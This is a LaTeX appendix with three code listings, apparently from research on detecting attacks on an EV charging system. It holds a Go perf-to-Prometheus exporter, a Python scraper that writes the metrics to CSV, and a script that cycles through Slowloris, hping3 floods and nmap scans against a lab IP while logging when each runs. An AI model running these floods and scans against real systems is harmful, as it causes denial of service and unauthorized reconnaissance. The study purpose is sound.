\begin{lstlisting}[caption={Go script for performance monitoring via perf for Prometheus}, label={lst:perf-prometheus-exporter}]
package main
import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"gopkg.in/yaml.v2"
)

// Config represents the structure of the YAML configuration file.
// It includes high-level performance counters (HCP), software events (SW), and hardware events (HW).
type Config struct {
	HCP []string `yaml:"hcp"`
	SW  []string `yaml:"sw"`
	HW  []string `yaml:"hw"`
}

// Global variable to store the most recent performance data.
var perfData string

// getPerfData runs `perf stat` with the specified events for a short duration (0.1s)
// and returns the raw output as a string.
func getPerfData(events []string) (string, error) {
	eventList := strings.Join(events, ",")
	cmd := exec.Command("perf", "stat", "-e", eventList, "--", "sleep", "0.1")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

// parsePerfData filters and extracts only the relevant lines from perf output,
// based on the provided list of events.
func parsePerfData(data string, events []string) string {
	lines := strings.Split(data, "\n")
	var result []string
	for _, line := range lines {
		for _, event := range events {
			if strings.Contains(line, event) {
				result = append(result, line)
				break
			}
		}
	}
	return strings.Join(result, "\n")
}

// formatForPrometheus converts the filtered performance data into Prometheus-compatible metrics format.
func formatForPrometheus(data string) string {
	lines := strings.Split(data, "\n")
	var result []string
	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			// Clean up the metric name
			metricName := strings.ReplaceAll(parts[1], ".", "_")
			// metricName = strings.ReplaceAll(metricName, "-", "_")
			// Remove decimal points from the number and parse it
			metricValue := strings.ReplaceAll(parts[0], ".", "")
			if value, err := strconv.ParseFloat(metricValue, 64); err == nil {
				// Format value appropriately for Prometheus (integer or float)
				if value == float64(int(value)) {
					result = append(result, fmt.Sprintf("%s %d", metricName, int(value)))
				} else {
					result = append(result, fmt.Sprintf("%s %f", metricName, value))
				}
			}
		}
	}
	return strings.Join(result, "\n")
}

// metricsHandler handles HTTP requests and returns the formatted performance metrics.
func metricsHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, formatForPrometheus(perfData))
}

// chunkEvents splits the list of events into smaller chunks of a given size.
// This helps avoid issues with perf's limit on the number of simultaneous counters.
func chunkEvents(events []string, chunkSize int) [][]string {
	var chunks [][]string
	for i := 0; i < len(events); i += chunkSize {
		end := i + chunkSize
		if end > len(events) {
			end = len(events)
		}
		chunks = append(chunks, events[i:end])
	}
	return chunks
}

// validateEvent checks if a given performance event is available on the system by using `perf list`.
func validateEvent(event string) bool {
	cmd := exec.Command("perf", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error listing perf events:", err)
		return false
	}
	return strings.Contains(string(output), event)
}

func main() {
	// Load the YAML configuration file
	config := Config{}
	data, err := ioutil.ReadFile("config.yml")
	if err != nil {
		fmt.Println("Error reading config file:", err)
		return
	}
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		fmt.Println("Error parsing config file:", err)
		return
	}

	// Validate and collect all available events from the config
	var validEvents []string
	for _, event := range append(config.HCP, config.SW...) {
		if validateEvent(event) {
			validEvents = append(validEvents, event)
		}
	}
	for _, event := range config.HW {
		if validateEvent(event) {
			validEvents = append(validEvents, event)
		}
	}

	// Split the events into manageable chunks (TODO: dynamically adjust based on CPU performance)
	eventChunks := chunkEvents(validEvents, 6)

	// Start a background goroutine to periodically collect performance data
	go func() {
		for {
			var allPerfData []string
			for _, chunk := range eventChunks {
				data, err := getPerfData(chunk)
				if err != nil {
					fmt.Println("Error:", err)
					allPerfData = append(allPerfData, "Error fetching data")
				} else {
					allPerfData = append(allPerfData, parsePerfData(data, chunk))
				}
			}
			// Combine data from all chunks into one string for Prometheus export
			perfData = strings.Join(allPerfData, "\n")
			time.Sleep(100 * time.Millisecond)
		}
	}()

	// Start the HTTP server that exposes the `/metrics` endpoint for Prometheus scraping
	http.HandleFunc("/metrics", metricsHandler)
	fmt.Println("Starting server on :9011")
	if err := http.ListenAndServe(":9011", nil); err != nil {
		fmt.Println("Error starting server:", err)
	}
}
\end{lstlisting}

\begin{lstlisting}[caption={Python script for scraping performance monitoring from Prometheus into an csv file}, label={lst:prometheustocsv_scraper}]
import requests
import csv
from datetime import datetime, timedelta
from collections import defaultdict
import numpy as np

from config_allevents import FEATURES

PROMETHEUS_URL = "http://192.168.1.25:9090"
STEP = "10"  # seconds
CHUNK_HOURS = 2

start_time = datetime.fromisoformat("2025-07-22T18:00:00.000000")
end_time = datetime.fromisoformat("2025-07-23T14:40:00.000000")

def build_chunks(start, end, chunk_hours):
    chunks = []
    chunk_delta = timedelta(hours=chunk_hours)
    current_start = start
    while current_start < end:
        current_end = min(current_start + chunk_delta, end)
        chunks.append((
            current_start.isoformat("T") + "Z",
            current_end.isoformat("T") + "Z"
        ))
        current_start = current_end
    return chunks

def query_metric_chunked(metric, chunks):
    all_results = []
    for chunk_start, chunk_end in chunks:
        url = f"{PROMETHEUS_URL}/api/v1/query_range"
        params = {
            "query": metric,
            "start": chunk_start,
            "end": chunk_end,
            "step": STEP,
        }
        response = requests.get(url, params=params)
        response.raise_for_status()
        all_results.extend(response.json()["data"]["result"])
    return all_results

def main():
    chunks = build_chunks(start_time, end_time, CHUNK_HOURS)
    data = defaultdict(dict)
    timestamps = set()
    values_dict = {}
    metric_query_map = {}

    for feat in FEATURES:
        prom_name = feat.replace("-", "_")
        url = f"{PROMETHEUS_URL}/api/v1/query"
        hit = False

        # 1. sum(prom_name) abfragen
        query = f"sum({prom_name})"
        params = {'query': query}
        try:
            resp = requests.get(url, params=params)
            resp.raise_for_status()
            results = resp.json()['data']['result']
            if results:
                value = float(results[0]['value'][1])
                values_dict[feat] = value
                metric_query_map[feat] = query
                hit = True
        except Exception:
            pass

        if hit:
            continue

        # 2. sum(perf_prom_name) abfragen
        prom_name_perf = 'perf_' + prom_name
        query = f"sum({prom_name_perf})"
        params = {'query': query}
        try:
            resp = requests.get(url, params=params)
            resp.raise_for_status()
            results = resp.json()['data']['result']
            if results:
                value = float(results[0]['value'][1])
                values_dict[feat] = value
                metric_query_map[feat] = query
                hit = True
        except Exception:
            pass

    values_array = []
    feature_names_for_array = []

    for feat in FEATURES:
        feature_names_for_array.append(feat)
        values_array.append(values_dict.get(feat, np.nan))

    for feat, querystr in metric_query_map.items():
        results = query_metric_chunked(querystr, chunks)
        for series in results:
            for timestamp, value in series["values"]:
                ts = datetime.utcfromtimestamp(float(timestamp)).isoformat()
                data[ts][feat] = value
                timestamps.add(ts)

    sorted_timestamps = sorted(timestamps)

    all_columns = list(FEATURES)

    with open("evse_metrics_wide.csv", "w", newline="") as f:
        writer = csv.writer(f)
        header = ["timestamp"] + all_columns
        writer.writerow(header)
        for ts in sorted_timestamps:
            row = [ts] + [data[ts].get(col, "") for col in all_columns]
            writer.writerow(row)

if __name__ == "__main__":
    main()
\end{lstlisting}

\begin{lstlisting}[caption={Python script for automatet attacks and storage of the timestamps}, label={lst:python_attack_script}]
import subprocess
import time
from datetime import datetime

commands = [
    ("Slowloris", ["python3", "slowloris.py", "192.168.1.25", "-s", "500"]),
    ("UDP Flood", ["sudo", "hping3", "--flood", "--udp", "-p", "80", "192.168.1.25"]),
    ("ICMP Flood", ["sudo", "hping3", "--flood", "-1", "192.168.1.25"]),
    ("TCP Flood", ["sudo", "hping3", "--flood", "-p", "80", "192.168.1.25"]),
    ("Synonymous Flood", ["sudo", "hping3", "--flood", "--rand-source", "-p", "80", "192.168.1.25"]),
    ("Portscan", ["bash", "-c", "for i in {1..1000}; do sudo nmap -sT 192.168.1.25; sleep 1; done"]),
    ("OS Fingerprinting", ["bash", "-c", "for i in {1..1000}; do sudo nmap -O 192.168.1.25; sleep 1; done"]),
    ("Aggressive Scan", ["bash", "-c", "for i in {1..1000}; do sudo nmap -A 192.168.1.25; sleep 1; done"]),
]

LOG_FILE = "timestamp_attacks.txt"
RUN_TIME = 15 * 60      # 15 Minuten
BREAK_TIME = 20 * 60    # 20 Minuten

def log_msg(msg):
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")

while True:
    for name, cmd in commands:
        start_time = datetime.now()
        print(f"Starte {name}: {' '.join(cmd)}")
        log_msg(f"Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - Angriff: {name} - Befehl: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd)
            proc.wait(timeout=RUN_TIME)
            note = "Erfolgreich beendet"
        except subprocess.TimeoutExpired:
            proc.terminate()
            try:
                proc.wait(10)
            except Exception:
                proc.kill()
            note = "Nach 15 Minuten abgebrochen"
        end_time = datetime.now()
        log_msg(f"Ende: {end_time.strftime('%Y-%m-%d %H:%M:%S')} ({note})")
        log_msg("Pause startet jetzt.\n")
        time.sleep(BREAK_TIME)
\end{lstlisting}